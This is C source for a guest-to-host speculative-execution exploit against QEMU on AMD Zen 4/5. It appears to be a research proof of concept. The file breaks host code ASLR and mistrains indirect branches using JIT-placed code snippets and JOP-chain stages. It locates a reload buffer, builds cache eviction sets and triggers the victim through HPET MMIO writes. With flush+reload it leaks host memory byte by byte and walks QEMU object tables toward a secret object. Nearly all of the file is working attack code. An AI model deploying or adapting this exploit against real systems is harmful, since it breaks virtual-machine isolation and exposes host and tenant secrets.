#include <ctype.h>
#include <errno.h>
#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#define CACHE_MISS_THRES 300
#define RB_OFFSET        0x10cc0
#define RB_SLOTS         8
#include "compiler.h"
#include "flush_reload.h"
#include "jita.h"
#include "log.h"
#include "mem.h"
#include "rb_tools_2mb.h"

uint64_t break_code_aslr(uint64_t *);

#define PAGE_4K     (4096UL)
#define PAGE_2M     (512 * PAGE_4K)
#define PAGE_1G     (512 * PAGE_2M)
#define PROT_RW     (PROT_READ | PROT_WRITE)
#define PROT_RWX    (PROT_RW | PROT_EXEC)
#define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)

// #define NO_MMIO
// #define DEBUG_HIT
// #define DEBUG_RB
// #define DEBUG_LEAK
// #define DEBUG_RESOLVE
// #define DEMO
#define AUTOMATIC_KEY_SELECTION

#define MMIO_BASE                0xfed00000
#define HVA_SRC                  0x555555e8bea1                  // offset 0x937ea1
#define HVA_VICTIM_DST           0x540000000000                  // offset 0x937ea1
#define HVA_DST_STAGE_1          (HVA_SRC - 0x937ea1 + 0xac334e) // offset 0x753aa9, JOP chain
#define HVA_DST_STAGE_2          (HVA_SRC - 0x937ea1 + 0x8260b5) // offset 0x9b0a01, JOP chain
#define HVA_DST_HPET             0x555555c41040                  // hpet target
#define QEMU_OBJECTMAYHEM_STATIC 0x5555571822f0
#define GADGET_OFFSET_0          0x2b58
#define GADGET_OFFSET_1          0x0
#define GADGET_OFFSET_2          0x0
#define NEXT_POINTER_OFFSET_2    0x2b50
#define EViCT_MEM_ADDR           0x700000000000

// automate the key selection when running evaluation
#ifdef AUTOMATIC_KEY_SELECTION
#define QEMU_MAGIC_ROOT_OBJECT   3
#define QEMU_MAGIC_SECRET_OBJECT 6
#else
#define QEMU_MAGIC_ROOT_OBJECT   -1
#define QEMU_MAGIC_SECRET_OBJECT -1
#endif

#define ROUNDS   4
#define RB_ENTRY 0

extern char psnip_src_call_label[];
extern char psnip_src_entry_label[];

// clang-format off
uarf_psnip_declare_define(psnip_src,
    "step3:\n\t"                // 0x555555e8be20
    ".fill 0x4b, 0x1, 0x90\n\t"
    "test %ebx,%ebx\n\t"        // 0x555555e8be6b
    "je step2\n\t"              // 0x555555e8be6d
    ".fill 0x21, 0x1, 0x90\n\t"
    
    "step1: \n\t"               // 0x555555e8be90
    ".fill 0x11, 0x1, 0x90\n\t"
    "psnip_src_call_label:\n\t"
    "call *0x8(%rax)\n\t"       // 0x555555e8bea1
    ".fill 0x2c, 0x1, 0x90\n\t"

    "step2:\n\t"
    "test %ebx,%ebx\n\t"        // 0x555555e8bed0
    "je step1\n\t"              // 0x555555e8bed2
    ".skip 0x7eac\n\t"

    "psnip_src_entry_label:\n\t"// 0x555555e93d80 <--- entrypoint of this snippet
    ".fill 0x4c, 0x1, 0x90\n\t"
    "test %ebx,%ebx\n\t"        // 0x555555de5188
    "je step5\n"                // 0x555555e93dce
    ".fill 0x3, 0x1, 0x90\n\t"

    "step4:\n\t"                // 0x555555e93dd7
    ".fill 0x84, 0x1, 0x90\n\t"
    "call *%rcx\n\t"            // 0x555555e93e5b
    ".fill 0x43, 0x1, 0x90\n\t"
    
    "step5:\n\t"                // 0x555555e93ea0
    ".fill 0x4c, 0x1, 0x90\n\t"
    "jmp step4\n\t"             // 0x555555e93eec
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_victim_dst, 
    "add $16, %rsp\n"
    "ret\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_train_stage_1, 
    ".fill 0x8, 0x1, 0x90\n\t"
    "call *0x10(%rax)\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_train_stage_2, 
    ".fill 0x100, 0x1, 0x90\n\t"
    "add $24, %rsp\n"
    "ret\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_hpet_signal_dst, 
    "mov (%rdx), %r8\n\t"
    "add $16, %rsp\n"
    "ret\n\t"
);
// clang-format on

#define MARCH_ZEN4
#if defined(MARCH_ZEN5)
#define NUM_MEASUREMENTS 8
#define EVICT_ITERATIONS 2
#define L2_EVICTION_SIZE 18
#define L2_SETS          1024
#define L2_FREE_SHIFT    16
#define L2_2MB_SET_SIZE  32
#define L2_1GB_SET_SIZE  1024 // max 8192
#define L3_SETS          32 * 1024
#define L3_SET_SIZE      32
#elif defined(MARCH_ZEN4)
#define NUM_MEASUREMENTS 16
#define EVICT_ITERATIONS 1
#define L2_EVICTION_SIZE 14
#define L2_SETS          2048
#define L2_FREE_SHIFT    17
#define L2_2MB_SET_SIZE  16
#define L2_1GB_SET_SIZE  512 // max 8192
#define L3_SETS          32 * 1024
#define L3_SET_SIZE      64
#else
#error "Unknown microarchitecture"
#endif

volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE] = {0};
uint64_t l2_sets_offset = 0;
uint64_t measurements[NUM_MEASUREMENTS];
uint64_t dst_victim_ptr[0x50];
uint64_t dst_train_ptr[0x50];
uint64_t dummy_val[0x1000];

static int stats_compare_u64(const void *a, const void *b) {
    return *(uint64_t *) a > *(uint64_t *) b;
}

uint64_t stats_median_u64(uint64_t *arr, uint64_t arr_len) {
    if (!arr_len)
        err(1, "0 length array has no median");

    uint64_t *copy = calloc(arr_len, sizeof(*arr));
    if (!copy)
        err(1, "failed to temp arr");

    memcpy(copy, arr, arr_len * sizeof(*arr));
    qsort(copy, arr_len, sizeof(*arr), stats_compare_u64);

    uint64_t median = copy[arr_len / 2];

    free(copy);

    return median;
}

uint64_t measure_self_eviction(volatile uint64_t **eviction_set) {
    for (int i = 0; i < NUM_MEASUREMENTS; ++i) {
        uint64_t start = rb_rdtsc();
        uarf_lfence();
        for (int e = 0; e < L2_EVICTION_SIZE; ++e) {
            *eviction_set[e];
        }
        uarf_lfence();
        uint64_t end = rb_rdtscp();
        measurements[i] = end - start;
    }
    uint64_t median = stats_median_u64(measurements, NUM_MEASUREMENTS);

    return median;
}

uint8_t check_self_eviction(volatile uint64_t **eviction_set, uint64_t baseline) {

    return measure_self_eviction(eviction_set) > baseline + 250;
}

uint8_t check_cross_eviction(volatile uint64_t **eviction_set_1,
                             volatile uint64_t **eviction_set_2, uint64_t baseline) {
    uint64_t volatile *eviction_set[L2_EVICTION_SIZE];
    for (int i = 0; i < L2_EVICTION_SIZE / 2; ++i) {
        eviction_set[i] = eviction_set_1[i];
    }
    for (int i = L2_EVICTION_SIZE / 2; i < L2_EVICTION_SIZE; ++i) {
        eviction_set[i] = eviction_set_2[i];
    }
    uint64_t total_time = measure_self_eviction(eviction_set);

    return total_time > baseline + 200;
}

uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t baseline,
                      volatile uint64_t *l2_sets[L2_SETS][L2_1GB_SET_SIZE]) {
    static volatile uint64_t *l2_set_wip[L2_SETS][L2_2MB_SET_SIZE] = {0};

    // reset state
    memset(l2_set_wip, 0, sizeof(l2_set_wip[0][0]) * L2_SETS * L2_2MB_SET_SIZE);
    memset(l2_sets, 0, sizeof(l2_sets[0][0]) * L2_SETS * L2_1GB_SET_SIZE);
    l2_sets_offset = 0;

    // find the first 2MB page where we can build all the sets
    for (uint64_t offset_2m = 4; offset_2m < PAGE_1G / PAGE_2M; ++offset_2m) {
        uint64_t base_2m = mem_ptr + (offset_2m << 21);

        // build the sets within the 2MB pages
        uint64_t offset_6b = 0;
        for (; offset_6b < L2_SETS; ++offset_6b) {
            uint64_t base_set = base_2m + (offset_6b << 6);

            for (uint64_t index = 0; index < L2_2MB_SET_SIZE; ++index) {
                l2_set_wip[offset_6b][index] =
                    (volatile uint64_t *) (base_set + (index << L2_FREE_SHIFT) + index);
            }

            if (!check_self_eviction(l2_set_wip[offset_6b], baseline)) {
                break;
            }

            if (offset_6b % 64 == 63) {
            }
        }

        if (offset_6b == L2_SETS) {
            // if this is the first one, just copy over all the sets
            uint64_t num_ok = 0;
            int64_t set_xor = 0;
            for (int64_t i = 0; i < L2_SETS; ++i) {
                // we can calculate a decent heuristic to speed up the
                // collision search
                int64_t search_start = i ^ set_xor;

                // base case, this is the first sets we found
                if (l2_sets_offset == 0) {
                    memcpy(l2_sets[i], l2_set_wip[i],
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                    num_ok += 1;
                }
                else {
                    // try to find an existing L2 set that this one belongs to
                    int64_t hit_index = -1;
                    for (int k = 0; k < 4 && hit_index == -1; ++k) {
                        for (int64_t j = 0; j < L2_SETS; ++j) {
                            int64_t cur_index = (search_start + j) % L2_SETS;
                            if (check_cross_eviction(l2_sets[cur_index], l2_set_wip[i],
                                                     baseline)) {
                                if (j != 0 && i != 0) {
                                    printf("\nMy heuristic is wrong!\n");
                                }
                                if (hit_index != -1) {
                                    err(1, "mutlihit");
                                }
                                hit_index = cur_index;
                                set_xor = cur_index ^ i;
                                break; // remove this to check the precision of our
                                       // approach
                            }
                        }
                    }
                    if (hit_index == -1) {
                        break;
                    }

                    // check that the set is not already extended
                    if (l2_sets[hit_index][l2_sets_offset]) {
                        break;
                    }

                    // add to the set
                    memcpy(&l2_sets[hit_index][l2_sets_offset], l2_set_wip[i],
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                    num_ok += 1;
                }
            }
            if (num_ok == L2_SETS) {
                printf(".");
                fflush(stdout);
                l2_sets_offset += L2_2MB_SET_SIZE;
            }
            else {
                // cleanup for multi-hit check
                for (int i = 0; i < L2_SETS; ++i) {
                    memset(&l2_sets[i][l2_sets_offset], 0,
                           L2_2MB_SET_SIZE * sizeof(l2_sets[0][0]));
                }
            }

            if (l2_sets_offset >= L2_1GB_SET_SIZE) {
                printf("\n");
                return 1;
            }
        }
    }
    printf("\n");
    return 0;
}

void trigger_ibpb() {
    uarf_pi_wrmsr(MSR_PRED_CMD, 1 << MSR_PRED_CMD__IBPB);
}

typedef struct actxt {
    uint64_t entry_point;
    uint64_t extra_call;
    uint64_t rb_hva;
    uint64_t stage_2_addr;
    int64_t rb_offset;
    volatile uint64_t **eviction_set;
    size_t eviction_set_size;
    volatile uint64_t *mmio;
} actxt_t;

uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
                    uint64_t pre_load_addr, uint64_t mmio_param, int rb_slot) {
    rb_reset();
    for (size_t i = 0; i < rounds; i++) {
        trigger_ibpb();

        // Train victim -> disclosure gadget using HVA
        {
            asm volatile(""
                         "call *%3\n\t"
                         :
                         : "a"(dst_train_ptr), "b"(0), "c"(actxt->extra_call),
                           "r"(actxt->entry_point)
                         : "r8", "memory");
        }

        rb_flush();

        if (actxt->eviction_set) {
            for (int k = 0; k < EVICT_ITERATIONS; ++k) {
                for (int e = 0; e < actxt->eviction_set_size; ++e) {
                    *actxt->eviction_set[e];
                    uarf_lfence();
                }
            }
        }
        if (pre_load_addr) {
            *(volatile uint64_t *) (pre_load_addr);
        }
        uarf_mfence();

#ifndef NO_MMIO
        actxt->mmio[0] = mmio_param;
#endif

        for (volatile size_t i = 0; i < 10000; i++) {
        }
        rb_reload();
    }

    if (rb_hist[rb_slot] > thresh) {

#ifdef DEBUG_RB
        printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), RB_ENTRY, rb_hist[RB_ENTRY]);
#endif
        return 1;
    }

    return 0;
}

uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
                          uint64_t thresh) {
    int64_t memory_offset = (RB_ENTRY * RB_STRIDE - (GADGET_OFFSET_2 - RB_OFFSET));
    uint64_t attack_ptr_gva = RB_PTR + memory_offset + actxt->rb_offset;
    uint64_t attack_ptr_hva = actxt->rb_hva + memory_offset + actxt->rb_offset;

    // set next target ourselves: MUAHAHA :D
    *(volatile uint64_t *) (attack_ptr_gva + NEXT_POINTER_OFFSET_2) = actxt->stage_2_addr;

    // put the secret pointer into the memory to be loaded by the gadget
    *(volatile uint64_t *) (attack_ptr_gva + GADGET_OFFSET_0) =
        secret_ptr - GADGET_OFFSET_1;

    return attack_loop(actxt, rounds, thresh, attack_ptr_gva + GADGET_OFFSET_0,
                       attack_ptr_hva, RB_ENTRY);
}

uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
    actxt_t sctxt = *actxt;

#define DOWN_EXTEND 64
#define UP_EXTEND   8
#ifdef DEBUG_LEAK
#define CHECK_RANGE     (256 + DOWN_EXTEND + UP_EXTEND)
#define QUICK_THRESHOLD 500
#else
#define CHECK_RANGE     256
#define QUICK_THRESHOLD 32
#endif
    // find a long chain that might wrap around
    int chain_start = -1;
#ifdef DEBUG_LEAK
    int chain_end = -1;
#endif
    int maybe_start = -1;
    int maybe_end = -1;
    int chain_size = 0;
    int max_chain_size = 0;
    int miss_count = 0;
    for (int i = 0; i < CHECK_RANGE; ++i) {
        sctxt.rb_offset = -i + DOWN_EXTEND;
        uint8_t hit = check_byte_thresh(&sctxt, secret_ptr, ROUNDS, ROUNDS / 2);

#ifdef DEBUG_LEAK
        if (hit) {
            printf("+");
        }
        else {
            printf("-");
        }
        if ((i + 1) % 64 == 0) {
            printf("\n");
        }
#endif

        if (hit) {
            if (maybe_start < 0) {
                maybe_start = i;
                chain_size = 0;
            }
            chain_size += 1;
            if (chain_size >= 4 && chain_size > max_chain_size) {
                chain_start = maybe_start;
                maybe_end = -1;
                max_chain_size = chain_size;
            }
#ifndef DEBUG_LEAK
            if (chain_size > QUICK_THRESHOLD) {
                break;
            }
#endif
        }
        else {
            if (maybe_end < 0) {
                maybe_end = i;
                miss_count = 0;
            }
            miss_count += 1;
            if (miss_count >= 3) {
#ifdef DEBUG_LEAK
                chain_end = maybe_end;
#endif
                maybe_start = -1;
            }
        }
    }
#ifdef DEBUG_LEAK
    printf("\n");
#endif
    uint8_t start_byte = ((chain_start + (256 + 55 - DOWN_EXTEND)) % 256);
    *byte = start_byte;
#ifdef DEBUG_LEAK
    uint8_t end_byte = ((chain_end + (256 + -12 - DOWN_EXTEND)) % 256);
    if (start_byte != end_byte) {
        printf("disagreement: %u != %u\n", start_byte, end_byte);
    }
#endif
    return 1;
}

uint64_t leak_pointer_reliably(actxt_t *ctxt, uint64_t secret_base_ptr,
                               uint64_t *result_ptr) {
#define ROOT_PTR_SIZE    8
#define PTR_LEAK_RETRIES 8
    union {
        uint8_t arr[ROOT_PTR_SIZE];
        uint64_t val;
        void *ptr;
    } ptr_arr[PTR_LEAK_RETRIES];
    for (int i = 0; i < PTR_LEAK_RETRIES; ++i) {
        for (uint64_t secret_offset = 0; secret_offset < ROOT_PTR_SIZE; ++secret_offset) {
            uint64_t secret_ptr = secret_base_ptr + secret_offset;
            while (!leak_byte(ctxt, secret_ptr, &ptr_arr[i].arr[secret_offset]))
                ;
        }
    }
    qsort(ptr_arr, PTR_LEAK_RETRIES, sizeof(*ptr_arr), stats_compare_u64);

    // try to find the pointer with the most occurences but in a lazy way
    uint64_t ptr = 0;
    uint8_t found = 0;
    {
        uint64_t ptr_cur = 0;
        uint64_t count = 0;
        uint64_t max_count = 0;
        for (int i = 0; i < PTR_LEAK_RETRIES; ++i) {
            if (ptr_arr[i].val != ptr_cur) {
                ptr_cur = ptr_arr[i].val;
                count = 1;
            }
            else {
                count += 1;
            }
            if (count > max_count && count > PTR_LEAK_RETRIES / 4) {
                max_count = count;
                ptr = ptr_cur;
                found = 1;
            }
        }
    }
    if (!found) {
        return 0;
    }

    // filter out clearly invalid pointers (when using 48-bit virtual addresses)
    if (ptr & 0xFFFF800000000000ul) {
        return 0;
    }

    *result_ptr = ptr;
    return 1;
}

uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
                       int default_selection, char *label_parent) {
#ifndef DEBUG_RESOLVE
    printf("%s", label_parent);
    fflush(stdout);
#endif
    uint64_t hash_table_ptr_ptr = parent_obj + 0x10;
    uint64_t hash_table_ptr;
    if (!leak_pointer_reliably(ctxt, hash_table_ptr_ptr, &hash_table_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve hash_table_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("hash_table_ptr: 0x%012lx\n", hash_table_ptr);
#else
    printf("->table");
    fflush(stdout);
#endif

    uint64_t hash_table_key_ptr_ptr = hash_table_ptr + 0x20;
    uint64_t hash_table_key_ptr;
    if (!leak_pointer_reliably(ctxt, hash_table_key_ptr_ptr, &hash_table_key_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve hash_table_key_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("hash_table_key_ptr: 0x%012lx\n", hash_table_key_ptr);
#else
    printf("->keys\n");
    fflush(stdout);
#endif

    uint8_t size;
    while (!leak_byte(ctxt, hash_table_ptr, &size))
        ;
#ifdef DEBUG_RESOLVE
    printf("size: 0x%02x\n", size);
#endif

    // get all the key pointers
    uint64_t *key_ptrs = calloc(size, sizeof(*key_ptrs));
    for (int i = 0; i < size; ++i) {
        if (!leak_pointer_reliably(ctxt, hash_table_key_ptr + i * sizeof(uint64_t),
                                   &key_ptrs[i])) {
            UARF_LOG_ERROR("Failed to retrieve hash_table_key_ptr[%d]\n", i);
            // return 1;
            continue;
        }
#ifdef DEBUG_RESOLVE
        printf("key_ptr[%02d]: 0x%012lx\n", i, key_ptrs[i]);
#endif
        printf("- keys[%02d]: ", i);
        if (key_ptrs[i] & 0xFFFF00000000ul) {
            uint8_t next_byte = 1;
            for (int b = 0; b < 32; b += 1) {
                while (!leak_byte(ctxt, key_ptrs[i] + b, &next_byte))
                    ;
                if (next_byte == 0)
                    break;
                printf("%c", next_byte);
                fflush(stdout);
            }
        }
        else {
            printf("(empty)");
        }
        printf("\n");
    }

    // select index to continue
    int index = default_selection;
    if (index < 0) {
        do {
            printf("select index to continue: ");
        } while (scanf("%d", &index) <= 0);
    }
    else {
        printf("auto selected index: %d\n", index);
    }
    if (index < 0 || index >= size) {
        UARF_LOG_ERROR("Invalid choice: %d/%d\n", index, size);
    }
    printf("%s->table", label_parent);

    uint64_t hash_table_value_ptr_ptr = hash_table_ptr + 0x30;
    uint64_t hash_table_value_ptr;
    if (!leak_pointer_reliably(ctxt, hash_table_value_ptr_ptr, &hash_table_value_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve hash_table_value_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("hash_table_value_ptr: 0x%012lx\n", hash_table_value_ptr);
#else
    printf("->values");
    fflush(stdout);
#endif

    // get the object at the specificed index
    uint64_t child_obj_prop_ptr_ptr = hash_table_value_ptr + index * sizeof(uint64_t);
    uint64_t child_obj_prop_ptr;
    if (!leak_pointer_reliably(ctxt, child_obj_prop_ptr_ptr, &child_obj_prop_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve child_obj_prop_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("child_obj_prop_ptr: 0x%012lx\n", child_obj_prop_ptr);
#else
    printf("[%d]", index);
    fflush(stdout);
#endif

    uint64_t child_obj_ptr_ptr = child_obj_prop_ptr + 0x40;
    uint64_t child_obj_ptr;
    if (!leak_pointer_reliably(ctxt, child_obj_ptr_ptr, &child_obj_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve child_obj_ptr\n");
        return 0;
    }
#ifdef DEBUG_RESOLVE
    printf("child_obj_ptr: 0x%012lx\n", child_obj_ptr);
#else
    printf("->opaque\n");
    fflush(stdout);
#endif
    *result_ptr = child_obj_ptr;

    return 1;
}

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    printf("### initialize ###\n");
    clock_t start_initialize = clock();

    uarf_pi_init();

    void *mem = mmap(_ptr(EViCT_MEM_ADDR), PAGE_1G, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MFD_HUGE_2MB, -1, 0);
    if (mem == MAP_FAILED) {
        UARF_LOG_ERROR("Failed to map 1G\n");
        return 1;
    }
    // make memory mapped and varying contents to ensure that pages are not combined
    for (uint64_t offset = 0; offset < PAGE_1G; offset += PAGE_4K) {
        *((volatile uint64_t *) (_ul(mem) + offset)) = offset;
    }

    rb_init();

#ifndef NO_MMIO
#ifdef DEBUG_RB
    uint64_t rb_gpa = uarf_va_to_pa(RB_PTR, 0);
    UARF_LOG_INFO("RB GPA: 0x%lx\n", rb_gpa);
#endif

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1) {
        UARF_LOG_ERROR("Failed to open /dev/mem\n");
        return 1;
    }

    volatile uint64_t *mmio =
        mmap(_ptr(0x13100000UL), 8, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MMIO_BASE);
    if (mmio == MAP_FAILED) {
        UARF_LOG_ERROR("Failed to map MMIO\n");
        return 1;
    }
    mmio[0] = 0xABABABABABABABAB; // test mmio
#endif

    clock_t end_initialize = clock();
#ifndef DEMO
    printf("initialize time = %fs\n",
           ((double) (end_initialize - start_initialize)) / CLOCKS_PER_SEC);
#endif

    printf("\n");
    printf("### break code ASLR ###");
    clock_t start_aslr = clock();
    uint64_t call_offset = ((uint64_t) psnip_src_call_label) - psnip_src.addr;
    uint64_t aslr_offset = 0;
    if (argc > 1) {
        printf("\nusing provided victim location\n");
        uint64_t aslr_addr;
        if (sscanf(argv[1], "0x%lx\n", &aslr_addr) < 0) {
            err(1, "sscanf");
        }
        aslr_offset = aslr_addr - HVA_SRC;
    }
    else {
        // we can try multiple times
        uint8_t res = 0;
        for (int retry = 0; retry < 4 && !(res = break_code_aslr(&aslr_offset)); ++retry)
            ;
        if (!res) {
            UARF_LOG_ERROR("failed to break code ASLR!\n");
            return 1;
        }
    }
    printf("victim at 0x%012lx\n", HVA_SRC + aslr_offset);
    clock_t end_aslr = clock();
#ifndef DEMO
    printf("code_aslr time = %fs\n", ((double) (end_aslr - start_aslr)) / CLOCKS_PER_SEC);
#endif
    uint64_t rb_hint = 0;
    if (argc > 2) {
        if (sscanf(argv[2], "0x%lx\n", &rb_hint) < 0) {
            err(1, "sscanf");
        }
    }

    UarfStub stub_src = uarf_stub_init();
    UarfStub stub_victim_dst = uarf_stub_init();
    UarfStub stub_signal_hpet_dst = uarf_stub_init();
    UarfStub stub_train_stage_1 = uarf_stub_init();
    UarfStub stub_train_stage_2 = uarf_stub_init();
    UarfJitaCtxt jita_src = uarf_jita_init();
    UarfJitaCtxt jita_victim_dst = uarf_jita_init();
    UarfJitaCtxt jita_signal_hpet_dst = uarf_jita_init();
    UarfJitaCtxt jita_train_stage_1 = uarf_jita_init();
    UarfJitaCtxt jita_train_stage_2 = uarf_jita_init();

    uarf_jita_push_psnip(&jita_src, &psnip_src);
    uarf_jita_push_psnip(&jita_victim_dst, &psnip_victim_dst);
    uarf_jita_push_psnip(&jita_signal_hpet_dst, &psnip_hpet_signal_dst);
    uarf_jita_push_psnip(&jita_train_stage_2, &psnip_train_stage_2);
    uarf_jita_push_psnip(&jita_train_stage_1, &psnip_train_stage_1);

    uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset + aslr_offset));
    uarf_jita_allocate(&jita_victim_dst, &stub_victim_dst, _ul(HVA_VICTIM_DST));
    uarf_jita_allocate(&jita_signal_hpet_dst, &stub_signal_hpet_dst,
                       HVA_DST_HPET + aslr_offset);
    uarf_jita_allocate(&jita_train_stage_1, &stub_train_stage_1,
                       _ul(HVA_DST_STAGE_1 + aslr_offset));
    uarf_jita_allocate(&jita_train_stage_2, &stub_train_stage_2,
                       _ul(HVA_DST_STAGE_2 + aslr_offset));

    uint64_t entry_offset = ((uint64_t) psnip_src_entry_label) - psnip_src.addr;
    uint64_t entry_point = stub_src.addr + entry_offset;
    uint64_t extra_call = stub_src.addr;

    dst_victim_ptr[1] = _ul(stub_victim_dst.addr);
    dst_victim_ptr[2] = 0;

    dst_train_ptr[1] = _ul(stub_train_stage_1.addr);
    dst_train_ptr[2] = _ul(stub_train_stage_2.addr);
    dummy_val[GADGET_OFFSET_0 >> 3] = _ul(dummy_val);

    actxt_t ctxt = {
        .entry_point = entry_point,
        .extra_call = extra_call,
        .stage_2_addr = stub_train_stage_2.addr,
#ifndef NO_MMIO
        .mmio = mmio,
#endif
    };

// check aslr
#ifdef DEBUG_HIT
    UARF_LOG_INFO("Check Hit\n");
#endif
    rb_reset();
    for (size_t i = 0; i < ROUNDS; i++) {
        trigger_ibpb();

#ifndef NO_MMIO
        mmio[0] = 0;
#endif

        rb_flush();
        uarf_mfence();
        // Value gets passed to RDX register of victim branch
        uint8_t *reload_ptr = _ptr(RB_PTR + RB_OFFSET + RB_ENTRY * RB_STRIDE);

        asm volatile("victim_label:\n"
                     "clflush (%1)\n\t"
                     "call *%4\n\t"
                     :
                     : "d"(reload_ptr), "a"(dst_victim_ptr), "b"(0), "c"(extra_call),
                       "r"(entry_point)
                     : "r8", "memory");

        for (volatile size_t i = 0; i < 10000; i++) {
        }
        rb_reload();
    }

    size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
#ifdef DEBUG_HIT
    printf("rb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi, rb_hist[maxi]);
#endif
    if (maxi != RB_ENTRY || rb_hist[RB_ENTRY] < ROUNDS / 2) {
        UARF_LOG_ERROR("not hitting it right\n");
        return 1;
    }
#ifdef DEBUG_HIT
    UARF_LOG_INFO("Hit OK\n");
    fflush(stdout);
#endif

    // search for the reload buffer
    uint64_t rb_hva = 0;
    printf("\n");
    printf("### search reload buffer ###");
    fflush(stdout);
    clock_t start_rb = clock();
    uint64_t rb_hva_test = 0x700000000000ul;
    if (aslr_offset == 0) {
        rb_hva_test = 0x7ff000000000ul;
    }
    if (rb_hint) {
        rb_hva_test = rb_hint - 0x100000000ul;
    }
    for (; rb_hva_test < 0x800000000000ul; rb_hva_test += PAGE_2M) {
        if ((rb_hva_test) % ((1 << 18) * PAGE_2M) == 0) {
            printf("\nsearch at 0x%012lx: ", rb_hva_test);
            fflush(stdout);
        }
        if ((rb_hva_test) % ((1 << 12) * PAGE_2M * 2) == 0) {
            printf(".");
            fflush(stdout);
        }
        if (attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET - GADGET_OFFSET_0,
                        RB_ENTRY) |
            attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET - GADGET_OFFSET_0,
                        RB_ENTRY)) {
            rb_hva = rb_hva_test;
            printf("\nbuffer at 0x%012lx", rb_hva);
            break;
        }
    }
    printf("\n");

    if (!rb_hva) {
        UARF_LOG_ERROR("Error getting rb_hva\n");
        return 1;
    }
    ctxt.rb_hva = rb_hva;
    clock_t end_rb = clock();
#ifndef DEMO
    printf("rb_aslr time = %fs\n", ((double) (end_rb - start_rb)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

    printf("\n");
    printf("### L3 eviction sets ###\n");
    printf("build: ");
    clock_t start_l3 = clock();
    volatile uint64_t *dummy_set[L2_EVICTION_SIZE] = {0};
    for (uint64_t i = 0; i < L2_EVICTION_SIZE; ++i) {
        dummy_set[i] = (volatile uint64_t *) (_ul(mem) + (i << 12));
    }
    uint64_t baseline = measure_self_eviction(dummy_set);
    if (!build_l2_sets(_ul(mem), baseline, l2_sets)) {
        UARF_LOG_ERROR("Failed to build L3 eviction sets!\n");
        return 1;
    }

    uint64_t secret_ptr_hva = rb_hva;
    uint64_t secret_ptr_gva = RB_PTR;
    *(volatile uint64_t *) (secret_ptr_gva) = 0;

    clock_t end_l3 = clock();
#ifndef DEMO
    printf("l3_build time = %fs\n", ((double) (end_l3 - start_l3)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

    clock_t start_search = clock();
    int found_set = 0;
    for (int i = 0; i < 8 && !found_set; ++i) {
        for (int l2_set = 0; l2_set < L2_SETS; ++l2_set) {
            ctxt.eviction_set = &l2_sets[l2_set][0];
            ctxt.eviction_set_size = L2_1GB_SET_SIZE;

            if (check_byte_thresh(&ctxt, secret_ptr_hva, ROUNDS, 0) |
                check_byte_thresh(&ctxt, secret_ptr_hva, ROUNDS, 0)) {
                printf("selected set: %d\n", l2_set);
                found_set = 1;
                break;
            }
        }
    }
    if (!found_set) {
        UARF_LOG_ERROR("Eviction set not found!\n");
        return 1;
    }
    clock_t end_search = clock();
#ifndef DEMO
    printf("l3_search time = %fs\n",
           ((double) (end_search - start_search)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

#ifdef DEBUG_LEAK
    printf("leak bytes for secret=0-256:\n");
    int success = 0;
    int kinda_success = 0;
    for (uint8_t s = 0; s < 256; ++s) {
        *(volatile uint8_t *) (secret_ptr_gva) = s;
        uarf_mfence();

        uint8_t res;
        if (!leak_byte(&ctxt, secret_ptr_hva, &res))
            printf("failed\n");
        if (res == s) {
            success += 1;
        }
        else {
            if (res >> 3 == s >> 3) {
                printf("small-bad: %d - %d\n", s, res);
                kinda_success += 1;
            }
            else {
                printf("big-bad: %d - %d\n", s, res);
            }
        }
        printf("s: %d - %u (%s)\n", s, res, s == res ? "ok" : "BAD");
        if (s == 255)
            break;
    }
    printf("success count = %d\n", success);
    printf("kinda_success count = %d\n", kinda_success);
    fflush(stdout);
    return 0;
#endif
    // 1. get root object pointer $root (0x5eabae986040)
    // 2. get root_table pointer at $root + 0x10 (0x5eabae986050) $root_table
    // (0x5eabae98de50 points to hash table)
    // 3. get root hash table size at $root_table + 0x0 (0x5eabae98de50, 4-byte)
    // 4. get root hash table key pointer $root_table + 0x20 (0x5eabae98de70)
    // 5. get root hash table value pointer $root_table + 0x30 (0x5eabae98de80)
    // 6. get the object key pointers behind the key pointer, just consecutive, each
    // 8-bytes
    // 7. get the value pointer behind the object values pointer, same but pointer to a
